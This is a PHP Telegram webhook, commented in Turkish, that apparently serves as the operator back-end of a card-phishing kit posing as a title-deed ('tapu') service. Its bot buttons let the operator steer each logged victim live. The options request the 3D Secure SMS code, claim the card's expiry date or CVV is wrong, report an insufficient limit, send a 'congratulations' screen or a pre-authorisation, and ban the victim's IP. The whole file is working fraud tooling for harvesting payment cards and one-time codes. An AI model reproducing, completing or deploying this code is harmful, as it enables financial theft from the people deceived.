<?php
/**
 * tg_webhook.php — Telegram Bot callback_query işleyici
 * Bot ayarlarından webhook URL: https://siteadresin/tapu/tg_webhook.php
 */
require_once __DIR__ . '/db.php';

$update = json_decode(file_get_contents('php://input'), true);
if (!$update) exit;

// Sadece callback_query işle
if (empty($update['callback_query'])) exit;

$cq       = $update['callback_query'];
$cq_id    = $cq['id'];
$data     = $cq['data'] ?? '';

// callback_data formatları:
//   aksiyon:{log_id}:{durum}
//   yenile:{log_id}

$parts = explode(':', $data);
$tip   = $parts[0] ?? '';
$bid   = (int)($parts[1] ?? 0);

if (!$bid) {
    tg_api('answerCallbackQuery', ['callback_query_id' => $cq_id, 'text' => 'Hata!']);
    exit;
}

if ($tip === 'yenile') {
    tg_mesaj_guncelle($bid);
    tg_api('answerCallbackQuery', ['callback_query_id' => $cq_id, 'text' => '🔄 Yenilendi']);
    exit;
}

if ($tip === 'aksiyon') {
    $aksiyon = $parts[2] ?? '';

    $durum_map = [
        'bekle','3d_gonder','3d_hatali','tebrik','kart_hatali',
        'eticaret_kapali','limit_yetersiz','kart_desteklenmiyor',
        'provizyon_gonder','provizyon_hatali','ip_ban',
    ];

    if ($aksiyon === 'ip_ban') {
        // IP'yi bul ve banla
        try {
            $st = db()->prepare("SELECT ip FROM tapu_logs WHERE id=? LIMIT 1");
            $st->execute([$bid]);
            $r = $st->fetch();
            if ($r) {
                ip_ban_ekle($r['ip'], 'Telegram bot üzerinden banlandı');
                db()->prepare("UPDATE tapu_logs SET durum='ip_ban', guncellendi=NOW() WHERE id=?")
                     ->execute([$bid]);
                tg_mesaj_guncelle($bid);
                tg_api('answerCallbackQuery', ['callback_query_id' => $cq_id, 'text' => "🚷 IP banlandı: {$r['ip']}"]);
            }
        } catch (Exception $e) {
            tg_api('answerCallbackQuery', ['callback_query_id' => $cq_id, 'text' => 'Hata: ' . $e->getMessage()]);
        }
        exit;
    }

    if (in_array($aksiyon, $durum_map)) {
        try {
            db()->prepare("UPDATE tapu_logs SET durum=?, guncellendi=NOW() WHERE id=?")
                 ->execute([$aksiyon, $bid]);
            tg_mesaj_guncelle($bid);
            $etiket = [
                'bekle'                  => '⏳ Bekletildi',
                '3d_gonder'              => '📩 SMS istendi',
                '3d_hatali'              => '❌ Hatalı 3D',
                'tebrik'                 => '✅ Tebrik gönderildi',
                'kart_hatali'            => '💳 Skt / Cvv hatalı',
                'eticaret_kapali'        => '🚫 E-ticaret kapalı',
                'limit_yetersiz'         => '💰 Limit yetersiz',
                'kart_desteklenmiyor'    => '🔕 Kart desteklenmiyor',
                'provizyon_gonder'       => '🔄 Provizyon gönderildi',
                'provizyon_hatali'       => '⚠️ Provizyon hatalı',
            ][$aksiyon] ?? $aksiyon;
            tg_api('answerCallbackQuery', ['callback_query_id' => $cq_id, 'text' => $etiket]);
        } catch (Exception $e) {
            tg_api('answerCallbackQuery', ['callback_query_id' => $cq_id, 'text' => 'DB Hata!']);
        }
        exit;
    }
}

tg_api('answerCallbackQuery', ['callback_query_id' => $cq_id, 'text' => 'Bilinmeyen komut']);
